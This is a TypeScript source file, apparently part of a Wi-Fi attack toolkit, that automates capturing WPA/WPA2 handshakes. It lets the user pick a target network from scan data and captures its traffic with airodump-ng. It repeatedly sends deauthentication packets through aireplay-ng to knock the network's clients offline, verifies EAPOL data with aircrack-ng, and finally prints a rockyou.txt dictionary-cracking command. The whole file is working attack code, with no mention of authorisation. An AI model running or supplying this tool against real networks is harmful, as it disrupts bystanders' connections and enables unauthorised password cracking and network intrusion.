import dotenv from 'dotenv';
import { spawn, ChildProcess } from 'child_process';
import { promises as fs } from 'fs';
import path from 'path';
import { createInterface } from 'readline';
import { DatabaseManager, NetworkInfo, ClientInfo } from './database';
import { setMonitorMode, setManagedMode } from './utils';

dotenv.config();

interface HandshakeCaptureOptions {
  bssid: string;
  channel: string;
  essid: string;
  duration?: number; // How long to capture (default: 60 seconds)
  deauthCount?: number; // Number of deauth packets to send (default: 5)
  deauthInterval?: number; // Seconds between deauth bursts (default: 10)
}

export class HandshakeCapture {
  private wifiInterface: string;
  private capturesDir: string;
  private dbManager: DatabaseManager;
  private captureProcess: ChildProcess | null = null;
  private deauthProcess: ChildProcess | null = null;

  constructor() {
    this.wifiInterface = process.env.WIFI_INTERFACE || '';
    if (!this.wifiInterface) {
      throw new Error('WIFI_INTERFACE environment variable is not set');
    }
    this.capturesDir = path.join(__dirname, '..', 'captures');
    this.dbManager = new DatabaseManager();
  }

  /**
   * List networks from database that can be targeted
   */
  async listNetworks(): Promise<NetworkInfo[]> {
    const db = await this.dbManager.loadDatabase();
    const networks = Array.from(db.uniqueNetworks.values())
      .filter(n => n.essid && n.essid.trim())
      .filter(n => n.privacy && (n.privacy.includes('WPA') || n.privacy.includes('WPA2')))
      .sort((a, b) => parseInt(b.power) - parseInt(a.power));
    
    return networks;
  }

  /**
   * Get clients associated with a specific BSSID
   */
  async getClientsForNetwork(bssid: string): Promise<ClientInfo[]> {
    const db = await this.dbManager.loadDatabase();
    const clients = Array.from(db.uniqueClients.values())
      .filter(c => c.bssid && c.bssid.toUpperCase() === bssid.toUpperCase());
    
    return clients;
  }

  /**
   * Start capturing on specific network
   */
  private async startCapture(options: HandshakeCaptureOptions): Promise<string> {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const sanitizedEssid = options.essid.replace(/[^a-zA-Z0-9-_]/g, '_');
    const outputPrefix = path.join(this.capturesDir, `handshake-${sanitizedEssid}-${timestamp}`);
    
    await fs.mkdir(this.capturesDir, { recursive: true });
    
    console.log(`\n📡 Starting capture on ${options.essid} (${options.bssid})...`);
    console.log(`   Channel: ${options.channel}`);
    console.log(`   Output: ${outputPrefix}.cap`);
    
    return new Promise((resolve, reject) => {
      this.captureProcess = spawn('sudo', [
        'airodump-ng',
        '--bssid', options.bssid,
        '-c', options.channel,
        '-w', outputPrefix,
        '--output-format', 'pcap',
        this.wifiInterface
      ]);

      let hasOutput = false;
      
      this.captureProcess.stderr?.on('data', (data) => {
        hasOutput = true;
        // airodump-ng outputs to stderr
      });

      this.captureProcess.stdout?.on('data', (data) => {
        hasOutput = true;
      });

      this.captureProcess.on('error', (error) => {
        reject(error);
      });

      // Give it a moment to start
      setTimeout(() => {
        if (hasOutput || this.captureProcess) {
          resolve(`${outputPrefix}-01.cap`);
        } else {
          reject(new Error('Failed to start capture'));
        }
      }, 2000);
    });
  }

  /**
   * Send deauthentication packets
   */
  private async sendDeauth(options: HandshakeCaptureOptions, clientMac?: string): Promise<void> {
    const deauthCount = options.deauthCount || 5;
    
    const args = [
      'aireplay-ng',
      '--deauth', deauthCount.toString(),
      '-a', options.bssid
    ];
    
    if (clientMac) {
      args.push('-c', clientMac);
      console.log(`💥 Sending ${deauthCount} deauth packets to client ${clientMac}...`);
    } else {
      console.log(`💥 Sending ${deauthCount} deauth packets (broadcast)...`);
    }
    
    args.push(this.wifiInterface);
    
    return new Promise((resolve, reject) => {
      this.deauthProcess = spawn('sudo', args);
      
      let output = '';
      
      this.deauthProcess.stdout?.on('data', (data) => {
        output += data.toString();
      });
      
      this.deauthProcess.stderr?.on('data', (data) => {
        output += data.toString();
      });
      
      this.deauthProcess.on('close', (code) => {
        if (code === 0) {
          console.log('✅ Deauth packets sent');
          resolve();
        } else {
          console.warn(`⚠️  Deauth process exited with code ${code}`);
          resolve(); // Don't reject, continue capturing
        }
      });
      
      this.deauthProcess.on('error', (error) => {
        console.warn(`⚠️  Deauth error: ${error.message}`);
        resolve(); // Don't reject, continue capturing
      });
    });
  }

  /**
   * Check if capture file contains a valid handshake with EAPOL data
   */
  private async checkForHandshake(capturePath: string): Promise<boolean> {
    console.log(`\n🔍 Checking for handshake in ${path.basename(capturePath)}...`);
    
    return new Promise((resolve) => {
      const check = spawn('sudo', ['aircrack-ng', capturePath]);
      
      let output = '';
      
      check.stdout?.on('data', (data) => {
        output += data.toString();
      });
      
      check.stderr?.on('data', (data) => {
        output += data.toString();
      });
      
      check.on('close', () => {
        // Check for error messages first
        const noEAPOL = output.includes('no EAPOL') || 
                       output.includes('Packets contained no EAPOL data') ||
                       output.includes('unable to process this AP');
        
        if (noEAPOL) {
          console.log('❌ No EAPOL data found - handshake not captured');
          resolve(false);
          return;
        }
        
        // Look for valid handshake indicators
        const hasHandshake = (output.includes('1 handshake') || 
                             output.includes('handshake')) &&
                             !output.includes('0 handshake');
        
        // Additional check for WPA format
        const hasWPA = output.match(/WPA \(\d+ handshake/);
        const hasValidWPA = hasWPA && !output.includes('WPA (0 handshake)');
        
        if (hasHandshake || hasValidWPA) {
          console.log('✅ Valid handshake with EAPOL data detected!');
          resolve(true);
        } else {
          console.log('❌ No valid handshake found yet');
          resolve(false);
        }
      });
    });
  }

  /**
   * Stop all running processes
   */
  private async stopProcesses(): Promise<void> {
    console.log('\n🛑 Stopping capture...');
    
    // Stop capture process
    if (this.captureProcess) {
      try {
        spawn('sudo', ['pkill', '-SIGINT', 'airodump-ng']);
        await new Promise(res => setTimeout(res, 1000));
      } catch (err) {
        console.warn('Warning: Could not stop capture process');
      }
      this.captureProcess = null;
    }
    
    // Stop deauth process
    if (this.deauthProcess) {
      try {
        spawn('sudo', ['pkill', '-9', 'aireplay-ng']);
      } catch (err) {
        // Ignore
      }
      this.deauthProcess = null;
    }
  }

  /**
   * Capture handshake for a specific network
   */
  async captureHandshake(options: HandshakeCaptureOptions): Promise<string> {
    const duration = options.duration || 60;
    const deauthInterval = options.deauthInterval || 10;
    let capturePath = '';
    
    try {
      // Set monitor mode
      await setMonitorMode(this.wifiInterface);
      
      // Start capture
      capturePath = await this.startCapture(options);
      
      // Get clients for this network
      const clients = await this.getClientsForNetwork(options.bssid);
      console.log(`\n👥 Found ${clients.length} known clients for this network`);
      
      // Send initial deauth burst
      await this.sendDeauth(options);
      
      // If we have specific clients, target them too
      if (clients.length > 0) {
        for (const client of clients.slice(0, 3)) { // Target up to 3 clients
          await new Promise(res => setTimeout(res, 2000));
          await this.sendDeauth(options, client.stationMac);
        }
      }
      
      // Continue capturing and periodically send deauth
      const startTime = Date.now();
      const endTime = startTime + (duration * 1000);
      let handshakeCaptured = false;
      let attempts = 0;
      
      console.log(`\n⏱️  Capturing for ${duration} seconds...`);
      
      while (Date.now() < endTime && !handshakeCaptured) {
        const remaining = Math.ceil((endTime - Date.now()) / 1000);
        process.stdout.write(`\r   Time remaining: ${remaining}s | Attempts: ${attempts}   `);
        
        await new Promise(res => setTimeout(res, deauthInterval * 1000));
        
        // Send another deauth burst
        if (Date.now() < endTime) {
          await this.sendDeauth(options);
          attempts++;
          
          // Check for handshake
          await new Promise(res => setTimeout(res, 2000));
          handshakeCaptured = await this.checkForHandshake(capturePath);
          
          if (handshakeCaptured) {
            console.log('\n\n🎉 Valid handshake with EAPOL data captured successfully!');
            break;
          }
        }
      }
      
      console.log('\n');
      
      if (!handshakeCaptured) {
        console.log('⚠️  Capture timeout reached without valid handshake');
        console.log('   Possible reasons:');
        console.log('   - No clients are connected to this network');
        console.log('   - Clients did not reconnect after deauth');
        console.log('   - Signal strength too weak');
        console.log('   - Wrong channel or BSSID');
        console.log('\n   You can verify manually with: sudo aircrack-ng ' + capturePath);
        console.log('   If it shows "no EAPOL data", the capture is not usable.');
      }
      
      return capturePath;
      
    } catch (error) {
      console.error('❌ Capture failed:', error);
      throw error;
    } finally {
      await this.stopProcesses();
      try {
        await setManagedMode(this.wifiInterface);
      } catch (error) {
        console.error('⚠️  Failed to restore managed mode:', error);
      }
    }
  }

  /**
   * Interactive network selection
   */
  async selectNetworkInteractive(): Promise<HandshakeCaptureOptions | null> {
    const networks = await this.listNetworks();
    
    if (networks.length === 0) {
      console.log('❌ No WPA/WPA2 networks found in database');
      console.log('   Run a scan first: npm run scan');
      return null;
    }
    
    console.log('\n' + '='.repeat(80));
    console.log('🎯 TARGET NETWORK SELECTION');
    console.log('='.repeat(80));
    console.log('\nAvailable WPA/WPA2 Networks:\n');
    
    networks.forEach((network, index) => {
      console.log(`  ${index + 1}) ${network.essid.padEnd(25)} | ${network.bssid} | Ch: ${network.channel.padEnd(3)} | Pwr: ${network.power.padEnd(4)}`);
    });
    
    console.log('\n' + '='.repeat(80));
    
    const rl = createInterface({
      input: process.stdin,
      output: process.stdout
    });
    
    return new Promise((resolve) => {
      rl.question('\nSelect network number (or 0 to cancel): ', (answer) => {
        rl.close();
        
        const selection = parseInt(answer);
        
        if (selection === 0 || isNaN(selection)) {
          console.log('Cancelled');
          resolve(null);
          return;
        }
        
        if (selection < 1 || selection > networks.length) {
          console.log('Invalid selection');
          resolve(null);
          return;
        }
        
        const network = networks[selection - 1];
        
        resolve({
          bssid: network.bssid,
          channel: network.channel,
          essid: network.essid
        });
      });
    });
  }
}

export async function captureHandshakeInteractive(): Promise<void> {
  const capture = new HandshakeCapture();
  
  const options = await capture.selectNetworkInteractive();
  
  if (!options) {
    return;
  }
  
  console.log(`\n🎯 Target: ${options.essid}`);
  console.log(`   BSSID: ${options.bssid}`);
  console.log(`   Channel: ${options.channel}\n`);
  
  const capturePath = await capture.captureHandshake(options);
  
  // Perform final verification
  console.log(`\n📁 Capture saved to: ${capturePath}`);
  console.log(`\n🔍 Performing final verification...`);
  
  // Use a private method via the class instance
  const isValid = await (capture as any).checkForHandshake(capturePath);
  
  if (isValid) {
    console.log(`\n✅ SUCCESS! Valid handshake with EAPOL data confirmed!`);
    console.log(`\n🔓 To crack the password, run:`);
    console.log(`   sudo aircrack-ng -w ./password-lists/rockyou.txt ${capturePath}`);
  } else {
    console.log(`\n❌ WARNING: No valid handshake found in capture file!`);
    console.log(`   The file does not contain usable EAPOL data.`);
    console.log(`   Try capturing again with these tips:`);
    console.log(`   - Ensure clients are actively connected to the network`);
    console.log(`   - Try a longer capture duration (2-5 minutes)`);
    console.log(`   - Move closer to the access point`);
    console.log(`   - Verify you're on the correct channel`);
  }
}
